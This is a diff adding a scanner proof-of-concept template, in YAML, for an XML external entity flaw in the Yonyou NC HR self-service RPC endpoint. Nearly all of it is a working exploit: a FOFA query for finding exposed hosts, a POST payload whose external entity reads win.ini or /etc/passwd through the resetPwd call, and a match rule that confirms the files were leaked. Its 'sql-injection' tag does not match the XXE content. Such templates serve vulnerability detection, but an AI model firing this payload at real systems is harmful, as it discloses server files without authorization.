@@ -1,0 +1,26 @@
+id: poc-yaml-yongyou-nc-smartweb2-rpc-d-xml-external-entity-injection
+info:
+  name: 用友NC smartweb2.RPC.d XML外部实体注入漏洞
+  severity: critical
+  tags:
+  - sql-injection
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC" && is_domain=false
+variables:
+  path: 'file:///C://windows//win.ini
+
+    file:///etc/passwd
+
+    '
+requests:
+- method: POST
+  path: /hrss/dorado/smartweb2.RPC.d?__rpc=true
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: __viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE
+    z [<!ENTITY Password SYSTEM "{{.path}}" >]><rpc transaction="10" method="resetPwd"><vps><p
+    name="__profileKeys">%26Password;</p ></vps></rpc>
+  expression: (status_code == 200 && contains(headers,"xml")) && ( (contains(body,"[fonts]")
+    && contains(body,"[files]")) || (contains(body,"root:") && contains(body,"/bin/bash"))
+    )
+transport: http
